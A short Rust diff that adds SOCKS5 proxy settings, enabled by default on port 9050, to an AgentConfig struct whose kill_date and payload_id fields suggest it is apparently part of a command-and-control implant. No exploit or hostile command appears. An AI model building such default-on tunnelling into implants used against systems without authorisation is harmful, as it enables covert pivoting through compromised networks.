@@ -16,6 +16,8 @@ pub struct AgentConfig {
     pub kill_date: Option<String>,
     pub payload_id: String,
     pub protocol: String,
+    pub socks5_enabled: bool,
+    pub socks5_port: u16,
 }
 
 impl Default for AgentConfig {
@@ -27,6 +29,8 @@ impl Default for AgentConfig {
             kill_date: None,
             payload_id: String::new(), // Empty string by default
             protocol: String::from("http"),
+            socks5_enabled: true,  // Enable by default
+            socks5_port: 9050,     // Default SOCKS5 port
         }
     }
 }
